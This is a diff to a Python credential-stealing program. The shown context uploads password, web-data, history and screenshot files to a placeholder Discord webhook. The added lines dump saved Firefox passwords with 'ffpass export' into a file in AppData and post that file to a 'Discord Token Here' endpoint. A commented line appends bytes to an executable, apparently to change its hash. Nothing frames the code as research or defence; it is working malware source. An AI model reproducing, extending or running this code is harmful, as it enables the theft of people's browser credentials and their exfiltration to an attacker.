@@ -114,7 +114,7 @@ def connectDB():
             session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
             session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
             files = {'file1': open('pwd.txt', 'rb'), 'file2': open('web.txt', 'rb'),'file3': open('history.txt', 'rb'),'file4': open('s.png', 'rb')}
-            session.post("discord web hook here", files=files, data=payloadd)
+            session.post("Discord Token Here", files=files, data=payloadd)
         #os.remove("s.png")
 if os.path.isdir(chromeDir):
         degsi= chromeDir1
@@ -138,3 +138,29 @@ if os.path.isdir(braveDir):
         degsi= braveDir
         connectDB()
 
+#echo "HashAppend" >> .\default.exe
+#Get-FileHash .\default.exe -Algorithm MD5
+
+try:
+    mozilla_profile = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox')
+    mozilla_profile_ini = os.path.join(mozilla_profile, r'profiles.ini')
+    profile = configparser.ConfigParser()
+    profile.read(mozilla_profile_ini)
+    data_path = os.path.normpath(os.path.join(mozilla_profile, profile.get('Profile0', 'Path')))
+    subprocesss = subprocess.Popen("ffpass export -d  " + data_path, shell=True, stdout=subprocess.PIPE)
+    subprocess_return = subprocesss.stdout.read()
+    passwords = str(subprocess_return)
+    with open('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\f1.txt', "a", encoding="utf-8") as file:
+        file.write(passwords.replace('\\r\n', ' '))
+    f = open('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\f1.txt', "rb")
+except:
+    pass
+       
+try:
+    with requests.Session() as session:
+        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
+        session.post("Discord Token Here", files="f1.txt")
+
+except Exception as e:
+    print(e)
